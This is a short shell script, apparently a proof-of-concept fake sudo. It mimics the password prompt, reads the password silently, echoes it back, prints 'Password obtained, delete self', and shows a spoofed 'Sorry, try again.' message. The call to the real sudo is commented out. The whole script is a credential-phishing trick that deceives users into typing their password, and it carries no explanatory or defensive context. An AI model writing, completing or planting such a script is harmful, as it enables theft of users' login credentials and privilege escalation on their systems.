echo -n Password: 
read -s password
printf "\n"
echo " * ${password}"
if [ ! -z "${password}" ]; then
	echo " * Password obtained, delete self"
fi
echo "Sorry, try again."
#sudo $@
echo " * Run real sudo"